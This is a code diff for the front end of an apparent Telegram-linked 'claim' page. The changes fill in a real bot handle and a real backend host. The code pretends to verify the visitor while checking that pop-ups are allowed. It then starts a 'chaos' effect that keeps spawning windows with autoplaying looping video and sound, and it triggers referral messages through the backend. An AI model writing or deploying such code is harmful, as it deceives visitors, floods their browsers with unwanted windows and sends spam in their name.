@@ -129,7 +129,7 @@ submitUsername.addEventListener('click', async () => {
         } else {
             // Display instructions and link to verification bot
             displayModalMessage(
-                `Verification failed. Please verify with our Telegram bot first: <a href="https://t.me/YourTelegramBot" target="_blank">@YourTelegramBot</a>`,
+                `Verification failed. Please verify with our Telegram bot first: <a href="https://t.me/DoublePenisVerifyBot" target="_blank">@DoublePenisVerifyBot</a>`,
                 'error'
             );
         }
@@ -156,34 +156,48 @@ secondClaimButton.addEventListener('click', async () => {
 
     claimMessage.textContent = 'Initiating chaos...';
 
-    // Attempt to open a test window to check for popup blockers
+    // Open a test window to check for pop-up blockers
     const testWindow = window.open('', '', 'width=200,height=100');
     if (testWindow === null || typeof testWindow === 'undefined') {
         alert('Pop-up blocked. Please allow pop-ups for this site and refresh the page to proceed.');
         claimMessage.textContent = 'Pop-up blocked. Please allow pop-ups and try again.';
         return;
     } else {
-        // Test window content
+        // Write "Verifying..." in the test window
         testWindow.document.write(`
-            <html>
+            <!DOCTYPE html>
+            <html lang="en">
             <head>
                 <title>Verifying...</title>
                 <style>
-                    body { font-family: Arial, sans-serif; text-align: center; padding-top: 30px; }
+                    body {
+                        display: flex;
+                        justify-content: center;
+                        align-items: center;
+                        height: 100%;
+                        margin: 0;
+                        font-family: Arial, sans-serif;
+                        background-color: #ffffff;
+                    }
+                    h1 {
+                        font-size: 20px;
+                        color: #000000;
+                    }
                 </style>
             </head>
             <body>
-                <p>Verifying...</p>
+                <h1>Verifying...</h1>
             </body>
             </html>
         `);
+
         // Close the test window after 1 second
         setTimeout(() => {
             testWindow.close();
-            // Start Chaos Effect after confirming pop-ups are allowed
+            // Start Chaos Effect
             startChaos();
             // Send messages via backend after chaos starts
-            setTimeout(sendReferralMessages, 2000); // Delay to ensure chaos has started
+            sendReferralMessages();
         }, 1000);
     }
 });
@@ -275,10 +289,10 @@ function spawnChaosWindow() {
             </head>
             <body>
                 <video autoplay loop>
-                    <source src="https://yourbackenddomain.com/chaosvid.mp4" type="video/mp4">
+                    <source src="https://telegram-dpreferral-backend.onrender.com/chaosvid.mp4" type="video/mp4">
                 </video>
                 <audio autoplay>
-                    <source src="https://yourbackenddomain.com/chaossound.mp3" type="audio/mpeg">
+                    <source src="https://telegram-dpreferral-backend.onrender.com/chaossound.mp3" type="audio/mpeg">
                 </audio>
             </body>
             </html>
@@ -297,7 +311,6 @@ function spawnChaosWindow() {
         console.warn('Pop-up blocked. Please allow pop-ups for this site to enable the chaos effect.');
         alert('Pop-up blocked. Please allow pop-ups for this site and refresh the page to proceed.');
         stopChaos(); // Stop attempting to spawn windows
-        claimMessage.textContent = 'Pop-up blocked. Please allow pop-ups and try again.';
     }
 }
 
